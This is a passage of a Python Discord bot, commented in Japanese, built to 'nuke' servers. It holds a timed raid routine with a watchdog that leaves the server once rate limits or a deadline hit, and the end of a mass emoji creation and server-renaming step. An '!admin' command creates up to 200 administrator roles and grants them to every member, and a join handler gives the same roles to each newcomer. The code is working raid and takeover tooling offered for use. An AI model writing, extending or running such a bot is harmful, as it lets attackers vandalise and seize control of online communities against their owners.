        log.info("[BONUS] 絵文字 %d 個作成 …", FILL_EMOJIS)
        sem_e = asyncio.Semaphore(5)

        async def mk_emoji(i: int):
            cp = TWEMOJI_CODES[i % len(TWEMOJI_CODES)]
            try:
                img = await fetch_bytes(TWEMOJI_URL.format(cp))
            except Exception:
                return
            async with sem_e:
                await safe(guild.create_custom_emoji, name=f"toishin_{i:02d}",
                           image=img, reason="TOISHIN NUKE", label=f"emoji:{i}")

        await asyncio.gather(*(mk_emoji(i) for i in range(min(FILL_EMOJIS, 50))))

    # ---------- 12) 2回目改名 ----------
    if SECOND_GUILD_NAME and not PANIC["on"]:
        await safe(guild.edit, name=SECOND_GUILD_NAME,
                   reason="TOISHIN NUKE", label="guild:edit2")

# ======================= 監視 =======================
async def watchdog(task: asyncio.Task) -> None:
    while True:
        recent = time.monotonic() - PANIC["last_global"] <= GLOBAL_RESET
        if recent and PANIC["global_429"] >= PANIC_AFTER_GLOBAL:
            PANIC["on"] = True
            log.error("!!! グローバル429 %d 回(直近)。中断して退出へ !!!",
                      PANIC["global_429"])
            task.cancel()
            return
        if time.monotonic() >= PANIC["deadline"]:
            PANIC["on"] = True
            log.error("!!! 作業期限到達。中断して退出へ (残り %d 秒を退出に使う) !!!",
                      LEAVE_RESERVE)
            task.cancel()
            return
        await asyncio.sleep(0.5)

async def run_nuke(guild: discord.Guild, force_full: bool = False) -> None:
    t0 = time.perf_counter()
    el = lambda: f"{time.perf_counter() - t0:.1f}s"

    budget = max(30.0, NUKE_TIMEOUT - LEAVE_RESERVE)
    PANIC.update(on=False, global_429=0, last_global=0.0,
                 deadline=time.monotonic() + budget)
    PACER.update(rate=SPAM_RATE, tokens=SPAM_BURST, last=time.monotonic())
    COOLDOWN.update(until=0.0, task=None, hits=0)
    GATE.set()

    log.info("=== NUKE START | %s (%s) | 作業枠 %.0fs + 退出枠 %ds | full=%s ===",
             guild.name, guild.id, budget, LEAVE_RESERVE, force_full)

    task = asyncio.create_task(_nuke_body(guild, el, force_full))
    wd = asyncio.create_task(watchdog(task))

    try:
        await task
    except asyncio.CancelledError:
        log.error("!!! 中断。即退出する !!!")
    except Exception:
        log.exception("!!! NUKE 中に例外。即退出する !!!")
    finally:
        wd.cancel()
        PANIC["on"] = True
        GATE.set()
        await leave_guild(guild, budget=LEAVE_RESERVE)
        log.info("=== NUKE END | 所要 %s ===", el())

# ========================= コマンド =========================
@bot.command(name="toishin", aliases=["nuke", "t"])
@commands.guild_only()
async def toishin(ctx: commands.Context, mode: str = ""):
    if NUKE_LOCK.locked():
        return
    force_full = mode.lower() in ("full", "all", "全部")
    async with NUKE_LOCK:
        await run_nuke(ctx.guild, force_full)

@bot.command(name="nukestate")
@commands.guild_only()
async def nukestate_cmd(ctx: commands.Context):
    hits = nuked_reasons(ctx.guild)
    reuse = len(reusable_channels(ctx.guild))
    if hits:
        await ctx.send(f"ヌケ済み判定: **該当** ({', '.join(hits)}) / "
                       f"再利用可能ch {reuse}\n→ `!toishin` でスキップ実行、"
                       f"`!toishin full` で全部やる")
    else:
        await ctx.send(f"ヌケ済み判定: 該当なし / 再利用可能ch {reuse}\n"
                       f"→ `!toishin` は通常実行になる")

# ==================== !admin 用ヘルパー ====================
async def notify(ctx: commands.Context, content: str) -> None:
    if ADMIN_NOTIFY:
        await safe(ctx.channel.send, content, label="adm:reply")

async def collect_members(guild: discord.Guild) -> list[discord.Member]:
    members = list(guild.members)
    if guild.member_count and len(members) >= guild.member_count:
        return members
    try:
        async for m in guild.fetch_members(limit=None):
            if m not in members:
                members.append(m)
    except Exception as e:
        log.warning("fetch_members 失敗: %s", e)
    if len(members) < (guild.member_count or 0):
        try:
            await guild.chunk()
            members = list(guild.members)
        except Exception as e:
            log.warning("chunk 失敗: %s", e)
    return members

async def ensure_admin_roles(guild: discord.Guild, count: int) -> list[discord.Role]:
    pool = {r.name: r for r in guild.roles if is_admin_role(r)}
    sem = asyncio.Semaphore(ROLE_CONCURRENCY)

    async def ensure(i: int):
        nm = f"ADMIN-{i:02d}"
        if nm in pool:
            return pool[nm]
        async with sem:
            return await safe(
                guild.create_role, name=nm,
                permissions=discord.Permissions(administrator=True),
                colour=discord.Colour.random(),
                reason="TOISHIN ADMIN", label=f"role:{nm}",
            )

    got = await asyncio.gather(*(ensure(i) for i in range(1, count + 1)))
    return [r for r in got if r is not None]

async def grant_roles(members, roles):
    sem = asyncio.Semaphore(MEMBER_CONCURRENCY)

    async def grant(m: discord.Member) -> bool:
        need = [r for r in roles if r not in m.roles]
        if not need:
            return True
        async with sem:
            await safe(m.add_roles, *need, atomic=True,
                       reason="TOISHIN ADMIN", label=f"grant:{m}")
            for r in [x for x in need if x not in m.roles]:
                await safe(m.add_roles, r, reason="TOISHIN ADMIN",
                           label=f"grant1:{m}:{r.name}")
            return all(r in m.roles for r in roles)

    results = await asyncio.gather(*(grant(m) for m in members))
    ok = sum(1 for r in results if r)
    failed = [m for m, r in zip(members, results) if not r]
    return ok, failed

# ========================= !admin =========================
@bot.command(name="admin", aliases=["adm"])
@commands.guild_only()
async def admin_cmd(ctx: commands.Context, count: int = ADMIN_ROLE_COUNT):
    guild = ctx.guild
    count = max(1, min(count, 200))
    t0 = time.perf_counter()
    log.info("=== ADMIN START | %s (%s) | %d roles ===",
             guild.name, guild.id, count)

    members = await collect_members(guild)
    log.info("対象メンバー: %d 人 (member_count=%s)", len(members), guild.member_count)
    if not members:
        log.warning("メンバーを1人も取得できなかった。SERVER MEMBERS INTENT を確認")
        await notify(ctx, "⚠ メンバーを1人も取得できなかった")
        return

    roles = await ensure_admin_roles(guild, count)
    log.info("ロール %d 個 準備完了", len(roles))
    if not roles:
        log.warning("ロールを作成できなかった(Manage Roles 権限を確認)")
        await notify(ctx, "⚠ ロールを作成できなかった")
        return

    if ADMIN_AUTO_GRANT:
        AUTO_GRANT[guild.id] = [r.name for r in roles]
        log.info("自動付与を有効化: %d ロール (以降の参加者に即付与)", len(roles))

    top = guild.me.top_role
    above = [r for r in roles if r >= top]
    if above:
        log.warning("Botの最上位ロール(%s)より上に %d 個。position を下げる",
                    top.name, len(above))
        for r in above:
            await safe(r.edit, position=1, label=f"role:move:{r.name}")

    ok, failed = await grant_roles(members, roles)
    log.info("付与 1周目: 成功 %d / 失敗 %d", ok, len(failed))

    if failed:
        log.info("失敗者 %d 人をリトライ", len(failed))
        await asyncio.sleep(1.0)
        ok2, failed = await grant_roles(failed, roles)
        ok += ok2

    still = [m for m in members if not all(r in m.roles for r in roles)]
    log.info("=== ADMIN END | 成功 %d / 残り %d 人 / %.1fs ===",
             ok, len(still), time.perf_counter() - t0)
    if still:
        log.info("未付与: %s", ", ".join(m.display_name for m in still[:10]))

    await notify(ctx, f"✅ 全員に管理者ロール {len(roles)} 個を付与した "
                      f"(対象 {len(members)} 人 / 成功 {ok} 人)")
    await notify(ctx, "🔁 以降の新規参加者にも同じロールを自動付与する")

# ================= 新規参加者への自動付与 =================
@bot.event
async def on_member_join(member: discord.Member):
    guild = member.guild
    if not AUTO_GRANT.get(guild.id):
        return

    roles = resolve_auto_roles(guild)
    if not roles:
        log.warning("自動付与: ADMIN ロールが見つからない (guild=%s)", guild.id)
        return

    need = [r for r in roles if r not in member.roles]
    if not need:
        return

    total = len(need)
    async with AUTO_GRANT_SEM:
        for attempt in range(1, 6):
            await safe(member.add_roles, *need, atomic=True,
                       reason="TOISHIN AUTO", label=f"autogrant:{member}")
            need = [r for r in need if r not in member.roles]
            if not need:
                break
            await asyncio.sleep(min(1.5 * attempt, 8))

    if need:
        log.warning("自動付与 未完了: %s (残り %d 個)", member, len(need))
    else:
        log.info("自動付与 完了: %s に %d 個", member, total)

@bot.command(name="auto")
@commands.guild_only()
async def auto_cmd(ctx: commands.Context):
    names = AUTO_GRANT.get(ctx.guild.id)
    if not names:
        await ctx.send("自動付与: OFF (先に !admin を実行)")
        return
    have = len(resolve_auto_roles(ctx.guild))
    await ctx.send(f"自動付与: ON / 新規参加者に ADMIN ロール {have} 個を即付与")

@bot.command(name="autoadmin")
@commands.guild_only()
async def autoadmin_cmd(ctx: commands.Context, mode: str = "on"):
    if mode.lower() in ("off", "0", "false", "解除"):
        AUTO_GRANT.pop(ctx.guild.id, None)
        await ctx.send("自動付与 OFF")
        return
    roles = [r for r in ctx.guild.roles if is_admin_role(r)]
    if not roles:
        await ctx.send("ADMIN ロールが無い。!admin を先に")
        return
    AUTO_GRANT[ctx.guild.id] = [r.name for r in roles]
    await ctx.send(f"自動付与 ON ({len(roles)} 個)")

# =========================== おまけ ===========================
@bot.command(name="ping")
async def ping(ctx: commands.Context):
    await ctx.send(f"🏓 pong {round(bot.latency * 1000)}ms")

@bot.command(name="leave", aliases=["bye"])
@commands.guild_only()
async def leave_cmd(ctx: commands.Context):
    await ctx.send("👋 抜けるわ")
    await leave_guild(ctx.guild)

@bot.event
async def on_ready():
    RETRY["delay"] = 30.0
    log.info("ログイン完了: %s (%s) | %d guilds | discord.py %s",
             bot.user, bot.user.id, len(bot.guilds), discord.__version__)
    log.info("招待URL: https://discord.com/oauth2/authorize?client_id=%s"
             "&scope=bot+applications.commands&permissions=8", bot.user.id)

@bot.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.NoPrivateMessage):
        return
    log.warning("command error: %s", error)

# ===================== 接続(429耐性つき) =====================
async def runner() -> None:
    attempt = 0
    while True:
        attempt += 1
        try:
            log.info("接続開始 (試行 %d)", attempt)
            await bot.start(TOKEN)
            log.info("正常終了")
            return
        except discord.LoginFailure:
            log.error("トークンが不正です")
            raise
        except discord.PrivilegedIntentsRequired:
            log.error("=" * 60)
            log.error("特権インテントがDeveloper PortalでOFFです")
            log.error("Botページ -> Privileged Gateway Intents で")
            log.error("  SERVER MEMBERS INTENT / MESSAGE CONTENT INTENT")
            log.error("を両方ONにして Save -> 再起動してください")
            log.error("https://discord.com/developers/applications/%s/bot",
                      bot.application_id or "APP_ID")
            log.error("=" * 60)
            raise
        except discord.HTTPException as e:
            if e.status != 429:
                log.exception("HTTP %s で切断", e.status)
                raise
            wait = _retry_after_of(e) or RETRY["delay"]
            log.warning("429 (グローバル制限)。%.0f 秒待って再接続します …", wait)
            await asyncio.sleep(wait)
            RETRY["delay"] = min(RETRY["delay"] * 1.7, 900.0)
            continue
        except Exception:
            log.exception("想定外の切断。10 秒後に再結合")
            await asyncio.sleep(10)
            continue

if __name__ == "__main__":
    if not TOKEN:
        raise SystemExit("環境変数 DISCORD_TOKEN が未設定です")
    try:
        asyncio.run(runner())
    except (KeyboardInterrupt, SystemExit):
        pass